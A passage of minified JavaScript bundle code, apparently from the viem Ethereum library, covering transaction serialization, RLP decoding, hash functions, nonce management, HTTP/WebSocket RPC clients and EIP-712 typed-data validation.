O==="eip1559"?E(v,k):O==="eip2930"?A(v,k):O==="eip4844"?y(v,k):O==="eip7702"?w(v,k):R(v,k)}function w(v,k){const{authorizationList:O,chainId:_,gas:I,nonce:T,to:B,value:U,maxFeePerGas:M,maxPriorityFeePerGas:N,accessList:q,data:P}=v;(0,f.assertTransactionEIP7702)(v);const C=(0,m.serializeAccessList)(q),j=(0,e.serializeAuthorizationList)(O);return(0,o.concatHex)(["0x04",(0,l.toRlp)([(0,c.numberToHex)(_),T?(0,c.numberToHex)(T):"0x",N?(0,c.numberToHex)(N):"0x",M?(0,c.numberToHex)(M):"0x",I?(0,c.numberToHex)(I):"0x",B??"0x",U?(0,c.numberToHex)(U):"0x",P??"0x",C,j,...S(v,k)])])}function y(v,k){const{chainId:O,gas:_,nonce:I,to:T,value:B,maxFeePerBlobGas:U,maxFeePerGas:M,maxPriorityFeePerGas:N,accessList:q,data:P}=v;(0,f.assertTransactionEIP4844)(v);let C=v.blobVersionedHashes,j=v.sidecars;if(v.blobs&&(typeof C>"u"||typeof j>"u")){const G=typeof v.blobs[0]=="string"?v.blobs:v.blobs.map(ne=>(0,c.bytesToHex)(ne)),Z=v.kzg,J=(0,n.blobsToCommitments)({blobs:G,kzg:Z});if(typeof C>"u"&&(C=(0,i.commitmentsToVersionedHashes)({commitments:J})),typeof j>"u"){const ne=(0,r.blobsToProofs)({blobs:G,commitments:J,kzg:Z});j=(0,s.toBlobSidecars)({blobs:G,commitments:J,proofs:ne})}}const z=(0,m.serializeAccessList)(q),$=[(0,c.numberToHex)(O),I?(0,c.numberToHex)(I):"0x",N?(0,c.numberToHex)(N):"0x",M?(0,c.numberToHex)(M):"0x",_?(0,c.numberToHex)(_):"0x",T??"0x",B?(0,c.numberToHex)(B):"0x",P??"0x",z,U?(0,c.numberToHex)(U):"0x",C??[],...S(v,k)],H=[],L=[],V=[];if(j)for(let G=0;G<j.length;G++){const{blob:Z,commitment:J,proof:ne}=j[G];H.push(Z),L.push(J),V.push(ne)}return(0,o.concatHex)(["0x03",j?(0,l.toRlp)([$,H,L,V]):(0,l.toRlp)($)])}function E(v,k){const{chainId:O,gas:_,nonce:I,to:T,value:B,maxFeePerGas:U,maxPriorityFeePerGas:M,accessList:N,data:q}=v;(0,f.assertTransactionEIP1559)(v);const P=(0,m.serializeAccessList)(N),C=[(0,c.numberToHex)(O),I?(0,c.numberToHex)(I):"0x",M?(0,c.numberToHex)(M):"0x",U?(0,c.numberToHex)(U):"0x",_?(0,c.numberToHex)(_):"0x",T??"0x",B?(0,c.numberToHex)(B):"0x",q??"0x",P,...S(v,k)];return(0,o.concatHex)(["0x02",(0,l.toRlp)(C)])}function A(v,k){const{chainId:O,gas:_,data:I,nonce:T,to:B,value:U,accessList:M,gasPrice:N}=v;(0,f.assertTransactionEIP2930)(v);const q=(0,m.serializeAccessList)(M),P=[(0,c.numberToHex)(O),T?(0,c.numberToHex)(T):"0x",N?(0,c.numberToHex)(N):"0x",_?(0,c.numberToHex)(_):"0x",B??"0x",U?(0,c.numberToHex)(U):"0x",I??"0x",q,...S(v,k)];return(0,o.concatHex)(["0x01",(0,l.toRlp)(P)])}function R(v,k){const{chainId:O=0,gas:_,data:I,nonce:T,to:B,value:U,gasPrice:M}=v;(0,f.assertTransactionLegacy)(v);let N=[T?(0,c.numberToHex)(T):"0x",M?(0,c.numberToHex)(M):"0x",_?(0,c.numberToHex)(_):"0x",B??"0x",U?(0,c.numberToHex)(U):"0x",I??"0x"];if(k){const q=(()=>{if(k.v>=35n)return(k.v-35n)/2n>0?k.v:27n+(k.v===35n?0n:1n);if(O>0)return BigInt(O*2)+BigInt(35n+k.v-27n);const j=27n+(k.v===27n?0n:1n);if(k.v!==j)throw new t.InvalidLegacyVError({v:k.v});return j})(),P=(0,a.trim)(k.r),C=(0,a.trim)(k.s);N=[...N,(0,c.numberToHex)(q),P==="0x00"?"0x":P,C==="0x00"?"0x":C]}else O>0&&(N=[...N,(0,c.numberToHex)(O),"0x","0x"]);return(0,l.toRlp)(N)}function S(v,k){const O=k??v,{v:_,yParity:I}=O;if(typeof O.r>"u")return[];if(typeof O.s>"u")return[];if(typeof _>"u"&&typeof I>"u")return[];const T=(0,a.trim)(O.r),B=(0,a.trim)(O.s);return[typeof I=="number"?I?(0,c.numberToHex)(1):"0x":_===0n?"0x":_===1n?(0,c.numberToHex)(1):_===27n?"0x":(0,c.numberToHex)(1),T==="0x00"?"0x":T,B==="0x00"?"0x":B]}return k2}var FJ;function qle(){if(FJ)return ES;FJ=1,Object.defineProperty(ES,"__esModule",{value:!0}),ES.serializeAuthorizationList=n;const t=lt(),e=iR();function n(r){if(!r||r.length===0)return[];const i=[];for(const s of r){const{chainId:o,nonce:a,...c}=s,l=s.address;i.push([o?(0,t.toHex)(o):"0x",l,a?(0,t.toHex)(a):"0x",...(0,e.toYParitySignatureArray)({},c)])}return i}return ES}var AS={},$J;function Vle(){if($J)return AS;$J=1,Object.defineProperty(AS,"__esModule",{value:!0}),AS.verifyAuthorization=r;const t=nc(),e=Ju(),n=UA();async function r({address:i,authorization:s,signature:o}){return(0,e.isAddressEqual)((0,t.getAddress)(i),await(0,n.recoverAuthorizationAddress)({authorization:s,signature:o}))}return AS}var D2={},ck={},HJ;function u$e(){return HJ||(HJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.promiseCache=void 0,t.withDedupe=n;const e=iy();t.promiseCache=new e.LruMap(8192);function n(r,{enabled:i=!0,id:s}){if(!i||!s)return r();if(t.promiseCache.get(s))return t.promiseCache.get(s);const o=r().finally(()=>t.promiseCache.delete(s));return t.promiseCache.set(s,o),o}})(ck)),ck}var zJ;function Wle(){if(zJ)return D2;zJ=1,Object.defineProperty(D2,"__esModule",{value:!0}),D2.buildRequest=a,D2.shouldRetry=c;const t=Kt(),e=Zu(),n=a0(),r=lt(),i=u$e(),s=tR(),o=Ns();function a(l,f={}){return async(h,m={})=>{const{dedupe:b=!1,methods:w,retryDelay:y=150,retryCount:E=3,uid:A}={...f,...m},{method:R}=h;if(w?.exclude?.includes(R))throw new n.MethodNotSupportedRpcError(new Error("method not supported"),{method:R});if(w?.include&&!w.include.includes(R))throw new n.MethodNotSupportedRpcError(new Error("method not supported"),{method:R});const S=b?(0,r.stringToHex)(`${A}.${(0,o.stringify)(h)}`):void 0;return(0,i.withDedupe)(()=>(0,s.withRetry)(async()=>{try{return await l(h)}catch(v){const k=v;switch(k.code){case n.ParseRpcError.code:throw new n.ParseRpcError(k);case n.InvalidRequestRpcError.code:throw new n.InvalidRequestRpcError(k);case n.MethodNotFoundRpcError.code:throw new n.MethodNotFoundRpcError(k,{method:h.method});case n.InvalidParamsRpcError.code:throw new n.InvalidParamsRpcError(k);case n.InternalRpcError.code:throw new n.InternalRpcError(k);case n.InvalidInputRpcError.code:throw new n.InvalidInputRpcError(k);case n.ResourceNotFoundRpcError.code:throw new n.ResourceNotFoundRpcError(k);case n.ResourceUnavailableRpcError.code:throw new n.ResourceUnavailableRpcError(k);case n.TransactionRejectedRpcError.code:throw new n.TransactionRejectedRpcError(k);case n.MethodNotSupportedRpcError.code:throw new n.MethodNotSupportedRpcError(k,{method:h.method});case n.LimitExceededRpcError.code:throw new n.LimitExceededRpcError(k);case n.JsonRpcVersionUnsupportedError.code:throw new n.JsonRpcVersionUnsupportedError(k);case n.UserRejectedRequestError.code:throw new n.UserRejectedRequestError(k);case n.UnauthorizedProviderError.code:throw new n.UnauthorizedProviderError(k);case n.UnsupportedProviderMethodError.code:throw new n.UnsupportedProviderMethodError(k);case n.ProviderDisconnectedError.code:throw new n.ProviderDisconnectedError(k);case n.ChainDisconnectedError.code:throw new n.ChainDisconnectedError(k);case n.SwitchChainError.code:throw new n.SwitchChainError(k);case n.UnsupportedNonOptionalCapabilityError.code:throw new n.UnsupportedNonOptionalCapabilityError(k);case n.UnsupportedChainIdError.code:throw new n.UnsupportedChainIdError(k);case n.DuplicateIdError.code:throw new n.DuplicateIdError(k);case n.UnknownBundleIdError.code:throw new n.UnknownBundleIdError(k);case n.BundleTooLargeError.code:throw new n.BundleTooLargeError(k);case n.AtomicReadyWalletRejectedUpgradeError.code:throw new n.AtomicReadyWalletRejectedUpgradeError(k);case n.AtomicityNotSupportedError.code:throw new n.AtomicityNotSupportedError(k);case 5e3:throw new n.UserRejectedRequestError(k);default:throw v instanceof t.BaseError?v:new n.UnknownRpcError(k)}}},{delay:({count:v,error:k})=>{if(k&&k instanceof e.HttpRequestError){const O=k?.headers?.get("Retry-After");if(O?.match(/\d/))return Number.parseInt(O,10)*1e3}return~~(1<<v)*y},retryCount:E,shouldRetry:({error:v})=>c(v)}),{enabled:b,id:S})}}function c(l){return"code"in l&&typeof l.code=="number"?l.code===-1||l.code===n.LimitExceededRpcError.code||l.code===n.InternalRpcError.code:l instanceof e.HttpRequestError&&l.status?l.status===403||l.status===408||l.status===413||l.status===429||l.status===500||l.status===502||l.status===503||l.status===504:!0}return D2}var CS={},qJ;function Gle(){if(qJ)return CS;qJ=1,Object.defineProperty(CS,"__esModule",{value:!0}),CS.defineChain=t;function t(e){return{formatters:void 0,fees:void 0,serializers:void 0,...e}}return CS}var SS={},VJ;function Kle(){if(VJ)return SS;VJ=1,Object.defineProperty(SS,"__esModule",{value:!0}),SS.extractChain=t;function t({chains:e,id:n}){return e.find(r=>r.id===n)}return SS}var TS={},WJ;function wM(){if(WJ)return TS;WJ=1,Object.defineProperty(TS,"__esModule",{value:!0}),TS.fromRlp=s;const t=Kt(),e=yw(),n=DA(),r=yr(),i=lt();function s(l,f="hex"){const h=(()=>{if(typeof l=="string"){if(l.length>3&&l.length%2!==0)throw new e.InvalidHexValueError(l);return(0,r.hexToBytes)(l)}return l})(),m=(0,n.createCursor)(h,{recursiveReadLimit:Number.POSITIVE_INFINITY});return o(m,f)}function o(l,f="hex"){if(l.bytes.length===0)return f==="hex"?(0,i.bytesToHex)(l.bytes):l.bytes;const h=l.readByte();if(h<128&&l.decrementPosition(1),h<192){const b=a(l,h,128),w=l.readBytes(b);return f==="hex"?(0,i.bytesToHex)(w):w}const m=a(l,h,192);return c(l,m,f)}function a(l,f,h){if(h===128&&f<128)return 1;if(f<=h+55)return f-h;if(f===h+55+1)return l.readUint8();if(f===h+55+2)return l.readUint16();if(f===h+55+3)return l.readUint24();if(f===h+55+4)return l.readUint32();throw new t.BaseError("Invalid RLP prefix")}function c(l,f,h){const m=l.position,b=[];for(;l.position-m<f;)b.push(o(l,h));return b}return TS}var xS={},GJ;function vM(){if(GJ)return xS;GJ=1,Object.defineProperty(xS,"__esModule",{value:!0}),xS.isHash=n;const t=So(),e=fa();function n(r){return(0,t.isHex)(r)&&(0,e.size)(r)===32}return xS}var IS={},fm={},co={},KJ;function l$e(){if(KJ)return co;KJ=1,Object.defineProperty(co,"__esModule",{value:!0}),co.ripemd160=co.RIPEMD160=co.md5=co.MD5=co.sha1=co.SHA1=void 0;const t=hle(),e=i0(),n=Uint32Array.from([1732584193,4023233417,2562383102,271733878,3285377520]),r=new Uint32Array(80);class i extends t.HashMD{constructor(){super(64,20,8,!1),this.A=n[0]|0,this.B=n[1]|0,this.C=n[2]|0,this.D=n[3]|0,this.E=n[4]|0}get(){const{A:T,B,C:U,D:M,E:N}=this;return[T,B,U,M,N]}set(T,B,U,M,N){this.A=T|0,this.B=B|0,this.C=U|0,this.D=M|0,this.E=N|0}process(T,B){for(let C=0;C<16;C++,B+=4)r[C]=T.getUint32(B,!1);for(let C=16;C<80;C++)r[C]=(0,e.rotl)(r[C-3]^r[C-8]^r[C-14]^r[C-16],1);let{A:U,B:M,C:N,D:q,E:P}=this;for(let C=0;C<80;C++){let j,z;C<20?(j=(0,t.Chi)(M,N,q),z=1518500249):C<40?(j=M^N^q,z=1859775393):C<60?(j=(0,t.Maj)(M,N,q),z=2400959708):(j=M^N^q,z=3395469782);const $=(0,e.rotl)(U,5)+j+P+z+r[C]|0;P=q,q=N,N=(0,e.rotl)(M,30),M=U,U=$}U=U+this.A|0,M=M+this.B|0,N=N+this.C|0,q=q+this.D|0,P=P+this.E|0,this.set(U,M,N,q,P)}roundClean(){(0,e.clean)(r)}destroy(){this.set(0,0,0,0,0),(0,e.clean)(this.buffer)}}co.SHA1=i,co.sha1=(0,e.createHasher)(()=>new i);const s=Math.pow(2,32),o=Array.from({length:64},(I,T)=>Math.floor(s*Math.abs(Math.sin(T+1)))),a=n.slice(0,4),c=new Uint32Array(16);class l extends t.HashMD{constructor(){super(64,16,8,!0),this.A=a[0]|0,this.B=a[1]|0,this.C=a[2]|0,this.D=a[3]|0}get(){const{A:T,B,C:U,D:M}=this;return[T,B,U,M]}set(T,B,U,M){this.A=T|0,this.B=B|0,this.C=U|0,this.D=M|0}process(T,B){for(let P=0;P<16;P++,B+=4)c[P]=T.getUint32(B,!0);let{A:U,B:M,C:N,D:q}=this;for(let P=0;P<64;P++){let C,j,z;P<16?(C=(0,t.Chi)(M,N,q),j=P,z=[7,12,17,22]):P<32?(C=(0,t.Chi)(q,M,N),j=(5*P+1)%16,z=[5,9,14,20]):P<48?(C=M^N^q,j=(3*P+5)%16,z=[4,11,16,23]):(C=N^(M|~q),j=7*P%16,z=[6,10,15,21]),C=C+U+o[P]+c[j],U=q,q=N,N=M,M=M+(0,e.rotl)(C,z[P%4])}U=U+this.A|0,M=M+this.B|0,N=N+this.C|0,q=q+this.D|0,this.set(U,M,N,q)}roundClean(){(0,e.clean)(c)}destroy(){this.set(0,0,0,0),(0,e.clean)(this.buffer)}}co.MD5=l,co.md5=(0,e.createHasher)(()=>new l);const f=Uint8Array.from([7,4,13,1,10,6,15,3,12,0,9,5,2,14,11,8]),h=Uint8Array.from(new Array(16).fill(0).map((I,T)=>T)),m=h.map(I=>(9*I+5)%16),b=(()=>{const B=[[h],[m]];for(let U=0;U<4;U++)for(let M of B)M.push(M[U].map(N=>f[N]));return B})(),w=b[0],y=b[1],E=[[11,14,15,12,5,8,7,9,11,13,14,15,6,7,9,8],[12,13,11,15,6,9,9,7,12,15,11,13,7,8,7,7],[13,15,14,11,7,7,6,8,13,14,13,12,5,5,6,9],[14,11,12,14,8,6,5,5,15,12,15,14,9,9,8,6],[15,12,13,13,9,5,8,6,14,11,12,11,8,6,5,5]].map(I=>Uint8Array.from(I)),A=w.map((I,T)=>I.map(B=>E[T][B])),R=y.map((I,T)=>I.map(B=>E[T][B])),S=Uint32Array.from([0,1518500249,1859775393,2400959708,2840853838]),v=Uint32Array.from([1352829926,1548603684,1836072691,2053994217,0]);function k(I,T,B,U){return I===0?T^B^U:I===1?T&B|~T&U:I===2?(T|~B)^U:I===3?T&U|B&~U:T^(B|~U)}const O=new Uint32Array(16);class _ extends t.HashMD{constructor(){super(64,20,8,!0),this.h0=1732584193,this.h1=-271733879,this.h2=-1732584194,this.h3=271733878,this.h4=-1009589776}get(){const{h0:T,h1:B,h2:U,h3:M,h4:N}=this;return[T,B,U,M,N]}set(T,B,U,M,N){this.h0=T|0,this.h1=B|0,this.h2=U|0,this.h3=M|0,this.h4=N|0}process(T,B){for(let L=0;L<16;L++,B+=4)O[L]=T.getUint32(B,!0);let U=this.h0|0,M=U,N=this.h1|0,q=N,P=this.h2|0,C=P,j=this.h3|0,z=j,$=this.h4|0,H=$;for(let L=0;L<5;L++){const V=4-L,G=S[L],Z=v[L],J=w[L],ne=y[L],re=A[L],le=R[L];for(let oe=0;oe<16;oe++){const ue=(0,e.rotl)(U+k(L,N,P,j)+O[J[oe]]+G,re[oe])+$|0;U=$,$=j,j=(0,e.rotl)(P,10)|0,P=N,N=ue}for(let oe=0;oe<16;oe++){const ue=(0,e.rotl)(M+k(V,q,C,z)+O[ne[oe]]+Z,le[oe])+H|0;M=H,H=z,z=(0,e.rotl)(C,10)|0,C=q,q=ue}}this.set(this.h1+P+z|0,this.h2+j+H|0,this.h3+$+M|0,this.h4+U+q|0,this.h0+N+C|0)}roundClean(){(0,e.clean)(O)}destroy(){this.destroyed=!0,(0,e.clean)(this.buffer),this.set(0,0,0,0,0)}}return co.RIPEMD160=_,co.ripemd160=(0,e.createHasher)(()=>new _),co}var ZJ;function Zle(){if(ZJ)return fm;ZJ=1,Object.defineProperty(fm,"__esModule",{value:!0}),fm.ripemd160=fm.RIPEMD160=void 0;const t=l$e();return fm.RIPEMD160=t.RIPEMD160,fm.ripemd160=t.ripemd160,fm}var YJ;function Yle(){if(YJ)return IS;YJ=1,Object.defineProperty(IS,"__esModule",{value:!0}),IS.ripemd160=i;const t=Zle(),e=So(),n=yr(),r=lt();function i(s,o){const a=o||"hex",c=(0,t.ripemd160)((0,e.isHex)(s,{strict:!1})?(0,n.toBytes)(s):s);return a==="bytes"?c:(0,r.toHex)(c)}return IS}var uk={},QJ;function Qle(){return QJ||(QJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.toEventHash=void 0;var e=U8();Object.defineProperty(t,"toEventHash",{enumerable:!0,get:function(){return e.toSignatureHash}})})(uk)),uk}var lk={},JJ;function Jle(){return JJ||(JJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.toEventSignature=void 0;var e=Mj();Object.defineProperty(t,"toEventSignature",{enumerable:!0,get:function(){return e.toSignature}})})(lk)),lk}var dk={},XJ;function Xle(){return XJ||(XJ=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.toFunctionHash=void 0;var e=U8();Object.defineProperty(t,"toFunctionHash",{enumerable:!0,get:function(){return e.toSignatureHash}})})(dk)),dk}var fk={},eX;function ede(){return eX||(eX=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.toFunctionSignature=void 0;var e=Mj();Object.defineProperty(t,"toFunctionSignature",{enumerable:!0,get:function(){return e.toSignature}})})(fk)),fk}var hm={},tX;function tde(){if(tX)return hm;tX=1,Object.defineProperty(hm,"__esModule",{value:!0}),hm.nonceManager=void 0,hm.createNonceManager=n,hm.jsonRpc=r;const t=V8(),e=iy();function n(i){const{source:s}=i,o=new Map,a=new e.LruMap(8192),c=new Map,l=({address:f,chainId:h})=>`${f}.${h}`;return{async consume({address:f,chainId:h,client:m}){const b=l({address:f,chainId:h}),w=this.get({address:f,chainId:h,client:m});this.increment({address:f,chainId:h});const y=await w;return await s.set({address:f,chainId:h},y),a.set(b,y),y},async increment({address:f,chainId:h}){const m=l({address:f,chainId:h}),b=o.get(m)??0;o.set(m,b+1)},async get({address:f,chainId:h,client:m}){const b=l({address:f,chainId:h});let w=c.get(b);return w||(w=(async()=>{try{const E=await s.get({address:f,chainId:h,client:m}),A=a.get(b)??0;return A>0&&E<=A?A+1:(a.delete(b),E)}finally{this.reset({address:f,chainId:h})}})(),c.set(b,w)),(o.get(b)??0)+await w},reset({address:f,chainId:h}){const m=l({address:f,chainId:h});o.delete(m),c.delete(m)}}}function r(){return{async get(i){const{address:s,client:o}=i;return(0,t.getTransactionCount)(o,{address:s,blockTag:"pending"})},set(){}}}return hm.nonceManager=n({source:r()}),hm}var xb={},RS={},PS={},nX;function EM(){if(nX)return PS;nX=1,Object.defineProperty(PS,"__esModule",{value:!0}),PS.withTimeout=t;function t(e,{errorInstance:n=new Error("timed out"),timeout:r,signal:i}){return new Promise((s,o)=>{(async()=>{let a;try{const c=new AbortController;r>0&&(a=setTimeout(()=>{i?c.abort():o(n)},r)),s(await e({signal:c?.signal||null}))}catch(c){c?.name==="AbortError"&&o(n),o(c)}finally{clearTimeout(a)}})()})}return PS}var B2={},rX;function nde(){if(rX)return B2;rX=1,Object.defineProperty(B2,"__esModule",{value:!0}),B2.idCache=void 0;function t(){return{current:0,take(){return this.current++},reset(){this.current=0}}}return B2.idCache=t(),B2}var iX;function _M(){if(iX)return RS;iX=1,Object.defineProperty(RS,"__esModule",{value:!0}),RS.getHttpRpcClient=i;const t=Zu(),e=EM(),n=Ns(),r=nde();function i(s,o={}){return{async request(a){const{body:c,fetchFn:l=o.fetchFn??fetch,onRequest:f=o.onRequest,onResponse:h=o.onResponse,timeout:m=o.timeout??1e4}=a,b={...o.fetchOptions??{},...a.fetchOptions??{}},{headers:w,method:y,signal:E}=b;try{const A=await(0,e.withTimeout)(async({signal:S})=>{const v={...b,body:Array.isArray(c)?(0,n.stringify)(c.map(I=>({jsonrpc:"2.0",id:I.id??r.idCache.take(),...I}))):(0,n.stringify)({jsonrpc:"2.0",id:c.id??r.idCache.take(),...c}),headers:{"Content-Type":"application/json",...w},method:y||"POST",signal:E||(m>0?S:null)},k=new Request(s,v),O=await f?.(k,v)??{...v,url:s};return await l(O.url??s,O)},{errorInstance:new t.TimeoutError({body:c,url:s}),timeout:m,signal:!0});h&&await h(A);let R;if(A.headers.get("Content-Type")?.startsWith("application/json"))R=await A.json();else{R=await A.text();try{R=JSON.parse(R||"{}")}catch(S){if(A.ok)throw S;R={error:R}}}if(!A.ok)throw new t.HttpRequestError({body:c,details:(0,n.stringify)(R.error)||A.statusText,headers:A.headers,status:A.status,url:s});return R}catch(A){throw A instanceof t.HttpRequestError||A instanceof t.TimeoutError?A:new t.HttpRequestError({body:c,cause:A,url:s})}}}}return RS}var NS={},hk={},sX;function rde(){return sX||(sX=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.socketClientCache=void 0,t.getSocketRpcClient=s;const e=Zu(),n=rM(),r=EM(),i=nde();t.socketClientCache=new Map;async function s(o){const{getSocket:a,keepAlive:c=!0,key:l="socket",reconnect:f=!0,url:h}=o,{interval:m=3e4}=typeof c=="object"?c:{},{attempts:b=5,delay:w=2e3}=typeof f=="object"?f:{},y=JSON.stringify({keepAlive:c,key:l,url:h,reconnect:f});let E=t.socketClientCache.get(y);if(E)return E;let A=0;const{schedule:R}=(0,n.createBatchScheduler)({id:y,fn:async()=>{const k=new Map,O=new Map;let _,I,T,B=!1;function U(){if(f&&A<b){if(B)return;B=!0,A++,I?.close(),setTimeout(async()=>{await M().catch(console.error),B=!1},w)}else k.clear(),O.clear()}async function M(){const N=await a({onClose(){for(const q of k.values())q.onError?.(new e.SocketClosedError({url:h}));for(const q of O.values())q.onError?.(new e.SocketClosedError({url:h}));U()},onError(q){_=q;for(const P of k.values())P.onError?.(_);for(const P of O.values())P.onError?.(_);U()},onOpen(){_=void 0,A=0},onResponse(q){const P=q.method==="eth_subscription",C=P?q.params.subscription:q.id,j=P?O:k,z=j.get(C);z&&z.onResponse(q),P||j.delete(C)}});if(I=N,c&&(T&&clearInterval(T),T=setInterval(()=>I.ping?.(),m)),f&&O.size>0){const q=O.entries();for(const[P,{onResponse:C,body:j,onError:z}]of q)j&&(O.delete(P),E?.request({body:j,onResponse:C,onError:z}))}return N}return await M(),_=void 0,E={close(){T&&clearInterval(T),I.close(),t.socketClientCache.delete(y)},get socket(){return I},request({body:N,onError:q,onResponse:P}){_&&q&&q(_);const C=N.id??i.idCache.take(),j=z=>{typeof z.id=="number"&&C!==z.id||(N.method==="eth_subscribe"&&typeof z.result=="string"&&O.set(z.result,{onResponse:j,onError:q,body:N}),N.method==="eth_unsubscribe"&&O.delete(N.params?.[0]),P(z))};k.set(C,{onResponse:j,onError:q});try{I.request({body:{jsonrpc:"2.0",id:C,...N}})}catch(z){q?.(z)}},requestAsync({body:N,timeout:q=1e4}){return(0,r.withTimeout)(()=>new Promise((P,C)=>this.request({body:N,onError:C,onResponse:P})),{errorInstance:new e.TimeoutError({body:N,url:h}),timeout:q})},requests:k,subscriptions:O,url:h},t.socketClientCache.set(y,E),[E]}}),[S,[v]]=await R();return v}})(hk)),hk}function d$e(){if(typeof WebSocket<"u")return WebSocket;if(typeof global.WebSocket<"u")return global.WebSocket;if(typeof window.WebSocket<"u")return window.WebSocket;if(typeof self.WebSocket<"u")return self.WebSocket;throw new Error("`WebSocket` is not supported in this environment")}const f$e=d$e(),h$e=Object.freeze(Object.defineProperty({__proto__:null,WebSocket:f$e},Symbol.toStringTag,{value:"Module"})),p$e=gre(h$e);var oX;function AM(){if(oX)return NS;oX=1,Object.defineProperty(NS,"__esModule",{value:!0}),NS.getWebSocketRpcClient=n;const t=Zu(),e=rde();async function n(r,i={}){const{keepAlive:s,reconnect:o}=i;return(0,e.getSocketRpcClient)({async getSocket({onClose:a,onError:c,onOpen:l,onResponse:f}){const h=await Promise.resolve().then(()=>p$e).then(E=>E.WebSocket),m=new h(r);function b(){m.removeEventListener("close",b),m.removeEventListener("message",w),m.removeEventListener("error",c),m.removeEventListener("open",l),a()}function w({data:E}){if(!(typeof E=="string"&&E.trim().length===0))try{const A=JSON.parse(E);f(A)}catch(A){c(A)}}m.addEventListener("close",b),m.addEventListener("message",w),m.addEventListener("error",c),m.addEventListener("open",l),m.readyState===h.CONNECTING&&await new Promise((E,A)=>{m&&(m.onopen=E,m.onerror=A)});const{close:y}=m;return Object.assign(m,{close(){y.bind(m)(),b()},ping(){try{if(m.readyState===m.CLOSED||m.readyState===m.CLOSING)throw new t.WebSocketRequestError({url:m.url,cause:new t.SocketClosedError({url:m.url})});const E={jsonrpc:"2.0",id:null,method:"net_version",params:[]};m.send(JSON.stringify(E))}catch(E){c(E)}},request({body:E}){if(m.readyState===m.CLOSED||m.readyState===m.CLOSING)throw new t.WebSocketRequestError({body:E,url:m.url,cause:new t.SocketClosedError({url:m.url})});return m.send(JSON.stringify(E))}})},keepAlive:s,reconnect:o,url:r})}return NS}var aX;function ide(){if(aX)return xb;aX=1,Object.defineProperty(xb,"__esModule",{value:!0}),xb.rpc=void 0,xb.getSocket=i;const t=_M(),e=AM();function n(s,{body:o,onError:a,onResponse:c}){return s.request({body:o,onError:a,onResponse:c}),s}async function r(s,{body:o,timeout:a=1e4}){return s.requestAsync({body:o,timeout:a})}async function i(s){const o=await(0,e.getWebSocketRpcClient)(s);return Object.assign(o.socket,{requests:o.requests,subscriptions:o.subscriptions})}return xb.rpc={http(s,o){return(0,t.getHttpRpcClient)(s).request(o)},webSocket:n,webSocketAsync:r},xb}var OS={},kS={},j2={},cX;function sde(){return cX||(cX=1,Object.defineProperty(j2,"__esModule",{value:!0}),j2.presignMessagePrefix=void 0,j2.presignMessagePrefix=`Ethereum Signed Message:
`),j2}var uX;function ode(){if(uX)return kS;uX=1,Object.defineProperty(kS,"__esModule",{value:!0}),kS.toPrefixedMessage=i;const t=sde(),e=os(),n=fa(),r=lt();function i(s){const o=typeof s=="string"?(0,r.stringToHex)(s):typeof s.raw=="string"?s.raw:(0,r.bytesToHex)(s.raw),a=(0,r.stringToHex)(`${t.presignMessagePrefix}${(0,n.size)(o)}`);return(0,e.concat)([a,o])}return kS}var lX;function XA(){if(lX)return OS;lX=1,Object.defineProperty(OS,"__esModule",{value:!0}),OS.hashMessage=n;const t=ha(),e=ode();function n(r,i){return(0,t.keccak256)((0,e.toPrefixedMessage)(r),i)}return OS}var pm={},mm={},rf={},dX;function ade(){if(dX)return rf;dX=1,Object.defineProperty(rf,"__esModule",{value:!0}),rf.InvalidStructTypeError=rf.InvalidPrimaryTypeError=rf.InvalidDomainError=void 0;const t=Ns(),e=Kt();class n extends e.BaseError{constructor({domain:o}){super(`Invalid domain "${(0,t.stringify)(o)}".`,{metaMessages:["Must be a valid EIP-712 domain."]})}}rf.InvalidDomainError=n;class r extends e.BaseError{constructor({primaryType:o,types:a}){super(`Invalid primary type \`${o}\` must be one of \`${JSON.stringify(Object.keys(a))}\`.`,{docsPath:"/api/glossary/Errors#typeddatainvalidprimarytypeerror",metaMessages:["Check that the primary type is a key in `types`."]})}}rf.InvalidPrimaryTypeError=r;class i extends e.BaseError{constructor({type:o}){super(`Struct type "${o}" is invalid.`,{metaMessages:["Struct type must not be a Solidity type."],name:"InvalidStructTypeError"})}}return rf.InvalidStructTypeError=i,rf}var fX;function sR(){if(fX)return mm;fX=1,Object.defineProperty(mm,"__esModule",{value:!0}),mm.serializeTypedData=l,mm.validateTypedData=f,mm.getTypesForEIP712Domain=h,mm.domainSeparator=m;const t=$r(),e=Gu(),n=ade(),r=pa(),i=fa(),s=lt(),o=L8(),a=e5(),c=Ns();function l(w){const{domain:y,message:E,primaryType:A,types:R}=w,S=(O,_)=>{const I={..._};for(const T of O){const{name:B,type:U}=T;U==="address"&&(I[B]=I[B].toLowerCase())}return I},v=R.EIP712Domain?y?S(R.EIP712Domain,y):{}:{},k=(()=>{if(A!=="EIP712Domain")return S(R[A],E)})();return(0,c.stringify)({domain:v,message:k,primaryType:A,types:R})}function f(w){const{domain:y,message:E,primaryType:A,types:R}=w,S=(v,k)=>{for(const O of v){const{name:_,type:I}=O,T=k[_],B=I.match(o.integerRegex);if(B&&(typeof T=="number"||typeof T=="bigint")){const[N,q,P]=B;(0,s.numberToHex)(T,{signed:q==="int",size:Number.parseInt(P,10)/8})}if(I==="address"&&typeof T=="string"&&!(0,r.isAddress)(T))throw new e.InvalidAddressError({address:T});const U=I.match(o.bytesRegex);if(U){const[N,q]=U;if(q&&(0,i.size)(T)!==Number.parseInt(q,10))throw new t.BytesSizeMismatchError({expectedSize:Number.parseInt(q,10),givenSize:(0,i.size)(T)})}const M=R[I];M&&(b(I),S(M,T))}};if(R.EIP712Domain&&y){if(typeof y!="object")throw new n.InvalidDomainError({domain:y});S(R.EIP712Domain,y)}if(A!=="EIP712Domain")if(R[A])S(R[A],E);else throw new n.InvalidPrimaryTypeError({primaryType:A,types:R})}function h({domain:w}){return[typeof w?.name=="string"&&{name:"name",type:"string"},w?.version&&{name:"version",type:"string"},(typeof w?.chainId=="number"||typeof w?.chainId=="bigint")&&{name:"chainId",type:"uint256"},w?.verifyingContract&&{name:"verifyingContract",type:"address"},w?.salt&&{name:"salt",type:"bytes32"}].filter(Boolean)}function m({domain:w}){return(0,a.hashDomain)({domain:w,types:{EIP712Domain:h({domain:w})}})}function 